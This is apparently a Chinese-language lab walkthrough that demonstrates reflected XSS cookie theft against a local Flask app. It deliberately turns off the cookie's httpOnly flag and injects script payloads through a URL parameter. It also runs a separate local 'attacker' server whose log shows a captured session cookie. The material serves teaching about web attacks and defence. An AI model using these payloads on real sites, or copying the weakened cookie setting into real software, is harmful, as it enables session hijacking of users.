# XSS窃取cookie的演示

## 参考
- [XSS常见攻击与防御](https://zhuanlan.zhihu.com/p/30475175)
- [injecting-flask](https://nvisium.com/blog/2015/12/07/injecting-flask.html)
- [利用反射型XSS漏洞，模拟获取登录账户的Cookie](https://www.jianshu.com/p/0f5974c386cb)


## 放开 httpOnly
为了方便演示XSS攻击，需要被攻击网站 `http://localhost:8080` 降低安全级别，放开httpOnly，这样可以让客户端浏览器的JS读取cookie，方便做XSS攻击

```
$ cat flask_playground/__init.py__
...
app.config['SESSION_COOKIE_HTTPONLY'] = False
...

```

## 启动 flask_playground/watchlist

```
$ cd flask_playground
$ flask run -h 0.0.0.0  -p 8080

```

## 简单的尝试，就能知道相关（被攻击）URL是否有 XSS漏洞
所有提交数据的地方都有可能存在XSS，可以用最简单脚本进行测试：

```
### 浏览器访问  
http://localhost:8080/hello-template-injection?name=<script>alert("反射型XSS攻击")</script>
```

alert执行生效（浏览器有弹窗），就说明该URL有XSS漏洞


## 用户在（被攻击）网站flask_playground/watchlist登录

```
### 浏览器访问 /login，并登录； 确认登录成功；
http://localhost:8080/login
```

通过chrome浏览器，可以看到有 "session" 这个cookie；


## 从有XSS漏洞的（被攻击）URL获取cookie
确保`用户在（被攻击）网站flask_playground/watchlist登录`

通过注入JS脚本，就能获取cookie
```
### 浏览器访问
http://localhost:8080/hello-template-injection?name=<script>alert(document.cookie)</script>
```

浏览器弹窗中显示cookie；
如果无法获取"session"这个cookie，请确认以上 httpOnly设置是否生效；

## 启动（带攻击性）网站服务 hacdtest

```
$ cd hacktest
$ export FLASK_ENV=development; export FLASK_APP=hacktest; flask run -h 0.0.0.0  -p 8001 
```


## 发布（带攻击性的）URL，获取cookie

攻击者在公网发布了（带攻击性）URL `http://localhost:8001/`  

确保`用户在（被攻击）网站flask_playground/watchlist登录`

该网站用户无意点击进入（带攻击性）URL
```
### 浏览器访问
http://localhost:8001/
```


观察（带攻击性）网站服务 hacdtest的日志，此时已经获取到被攻击）网站用户的cookie

```
...
[2020-06-12 15:46:07,502] DEBUG in __init__: hack cookie...
127.0.0.1 - - [12/Jun/2020 15:46:07] "GET / HTTP/1.1" 200 -
[2020-06-12 15:46:07,597] DEBUG in __init__: session=.eJwljkEOwzAIBP_COQdDMDb5TIUxqL0mzanq32upmuvOaj7wyDOuJxzv844NHq8JB7RotYUad7FY9ES1iCFFKjXaY6BiJHHgFHH0NB80rWV21-JC6SxU09CZTJY3eOleSkcaa6HReZKuh1FkZ22u1ZGyqjsRbHBfcf5jEL4__5svnQ.XuMINg.6btOKnvtscqHU9Oqe30zZVojaks

...

```

